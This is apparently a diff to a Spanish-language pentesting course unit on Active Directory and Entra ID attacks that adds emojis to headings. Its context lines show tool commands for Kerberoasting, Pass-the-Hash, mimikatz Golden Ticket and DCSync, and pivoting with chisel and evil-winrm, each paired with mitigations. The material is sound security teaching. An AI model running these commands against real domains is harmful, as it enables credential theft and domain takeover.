@@ -1,6 +1,6 @@
-# Unidad 4: Hacking de Identidad y AD Moderno
+# 🔐 Unidad 4: Hacking de Identidad y AD Moderno
 
-## Objetivos de Aprendizaje
+## 🎯 Objetivos de Aprendizaje
 
 - **Evaluar** la seguridad de entornos Active Directory.
 - **Explotar** vulnerabilidades comunes en AD (Kerberoasting, Pass-the-Hash, Golden Ticket).
@@ -9,13 +9,13 @@
 
 ---
 
-## Contenido Teórico
+## 📚 Contenido Teórico
 
-### 4.1 Active Directory Fundamentals
+### 🔐 4.1 Active Directory Fundamentals
 
 Active Directory (AD) es el servicio de directorio de Microsoft que gestiona identidades y recursos en redes empresariales. Es el objetivo principal en evaluaciones de seguridad corporativas.
 
-#### Arquitectura de AD
+#### 🔧 Arquitectura de AD
 
 **Componentes clave**:
 
@@ -34,7 +34,7 @@ Forest (contoso.com)
         └── OU: Workstations
 ```
 
-#### Protocolos de Autenticación
+#### 🔑 Protocolos de Autenticación
 
 **Kerberos**:
 - Protocolo default en AD moderno
@@ -52,7 +52,7 @@ Forest (contoso.com)
 - Puertos 389 (LDAP) y 636 (LDAPS)
 - Autenticación simple y SASL
 
-#### Trusts y Relaciones de Confianza
+#### 🤝 Trusts y Relaciones de Confianza
 
 - **Parent-Child**: Entre dominios en mismo forest
 - **Forest Trust**: Entre forests diferentes
@@ -61,9 +61,9 @@ Forest (contoso.com)
 
 ---
 
-### 4.2 AD Attacks
+### ⚔️ 4.2 AD Attacks
 
-#### Kerberoasting
+#### 🎯 Kerberoasting
 
 **Concepto**: Solicitar tickets de servicio (TGS) para crackear offline.
 
@@ -87,12 +87,12 @@ hashcat -m 13100 hash.txt wordlist.txt
 john --format=krb5tgs hash.txt
 ```
 
-**Mitigación**:
+**Mitigación** 🛡️:
 - Usar cuentas managed service (gMSA)
 - Contraseñas fuertes para cuentas con SPN
 - Monitorear eventos 4769 (TGS solicitado)
 
-#### AS-REP Roasting
+#### 🔓 AS-REP Roasting
 
 **Concepto**: Solicitar TGT sin pre-authentication para usuarios que la tienen deshabilitada.
 
@@ -106,7 +106,7 @@ python3 GetNPUsers.py contoso.com/ -usersfile users.txt
 - Habilitar Kerberos Pre-Authentication
 - Monitorear eventos 4768
 
-#### Pass-the-Hash (PtH)
+#### 🐛 Pass-the-Hash (PtH)
 
 **Concepto**: Autenticarse usando el hash NTLM en lugar de la contraseña.
 
@@ -124,13 +124,13 @@ crackmapexec smb 10.10.10.10 -u admin -H hash --mimikatz
 python3 psexec.py contoso.com/username@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 ```
 
-**Mitigación**:
+**Mitigación** 🛡️:
 - Enable Protected Users group
 - Disable NTLM authentication
 - Use Credential Guard
 - Network segmentation
 
-#### Golden Ticket
+#### 🎫 Golden Ticket
 
 **Concepto**: Crear un TGT falso usando el hash del krbtgt account.
 
@@ -148,7 +148,7 @@ mimikatz.exe "kerberos::golden /domain:contoso.com /sid:S-1-5-21-xxx /krbtgt:has
 - Monitorizar eventos de creación de tickets
 - Disable ticket delegation
 
-#### DCSync
+#### 🔄 DCSync
 
 **Concepto**: Simular ser un DC para sincronizar datos de directorio.
 
@@ -164,11 +164,11 @@ mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:contoso.com /user:admin
 
 ---
 
-### 4.3 Azure AD / Entra ID
+### ☁️ 4.3 Azure AD / Entra ID
 
 Azure AD (ahora Entra ID) es el servicio de identidad cloud de Microsoft.
 
-#### Vulnerabilidades Comunes
+#### ⚠️ Vulnerabilidades Comunes
 
 **Token Theft**:
 - Tokens en URL
@@ -185,7 +185,7 @@ Azure AD (ahora Entra ID) es el servicio de identidad cloud de Microsoft.
 - Device compliance bypass
 - MFA fatigue
 
-#### Herramientas
+#### 🔧 Herramientas
 
 **AADInternals**:
 ```powershell
@@ -203,7 +203,7 @@ roadrecon auth --device-code
 roadrecon dump
 ```
 
-**Mitigación**:
+**Mitigación** 🛡️:
 - Enable Conditional Access
 - Require MFA
 - Monitor sign-in logs
@@ -211,11 +211,11 @@ roadrecon dump
 
 ---
 
-### 4.4 Pivoting
+### 🔀 4.4 Pivoting
 
 Una vez comprometido un sistema, el pivoting permite acceder a redes internas.
 
-#### Lateral Movement
+#### ↔️ Lateral Movement
 
 **SMB/Windows**:
 ```bash
@@ -238,7 +238,7 @@ python3 wmiexec.py domain/user:pass@target
 evil-winrm -i target -u user -p password
 ```
 
-#### Proxy Chaining
+#### 🔗 Proxy Chaining
 
 **Chisel**:
 ```bash
@@ -255,7 +255,7 @@ chisel client 10.10.10.5:8080 R:socks
 proxychains nmap -sT -p- 10.10.10.20
 ```
 
-#### Port Forwarding
+#### 🔀 Port Forwarding
 
 **SSH**:
 ```bash
@@ -273,7 +273,7 @@ plink.exe -L 8080:localhost:80 user@target
 
 ---
 
-## Herramientas
+## 🛠️ Herramientas
 
 | Herramienta | Propósito | Instalación |
 |-------------|-----------|-------------|
@@ -288,7 +288,7 @@ plink.exe -L 8080:localhost:80 user@target
 
 ---
 
-## Laboratorio
+## 🔬 Laboratorio
 
 > Ver [`labs/lab-unidad4.md`](../labs/lab-unidad4.md) para el escenario completo.
 
@@ -302,7 +302,7 @@ plink.exe -L 8080:localhost:80 user@target
 
 ---
 
-## Recursos Adicionales
+## 📚 Recursos Adicionales
 
 - [Microsoft — Best Practices for Securing Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory) — documentación oficial de Microsoft sobre hardening de AD
 - [BloodHound Documentation](https://bloodhound.readthedocs.io/) — guía oficial de la herramienta de análisis de rutas de ataque en AD
@@ -313,7 +313,7 @@ plink.exe -L 8080:localhost:80 user@target
 
 ---
 
-## Bibliografía
+## 📖 Bibliografía
 
 - [HackTricks - Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
 - [BloodHound Documentation](https://bloodhound.readthedocs.io/)
